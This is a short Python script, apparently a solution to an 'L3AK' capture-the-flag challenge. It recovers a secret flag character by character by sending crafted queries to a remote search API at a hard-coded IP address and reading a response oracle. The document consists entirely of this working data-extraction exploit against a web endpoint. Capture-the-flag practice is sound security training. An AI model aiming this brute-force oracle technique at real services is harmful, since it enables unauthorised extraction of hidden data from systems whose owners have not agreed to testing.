import requests
import string

FLAG = 'L3AK{'
c = ''

while c != '}':
    for c in string.printable:
        payload = FLAG[-2:] + c
        resp = requests.post(
            # 'http://localhost:3000/api/search',
            'http://34.134.162.213:17000/api/search',
            json={'query': payload},
        )
        if b"hidden" in resp.content:
            FLAG = FLAG + c
            print(FLAG)
            continue
    
print(f"DONE! the flag is: {FLAG}")
exit(0)
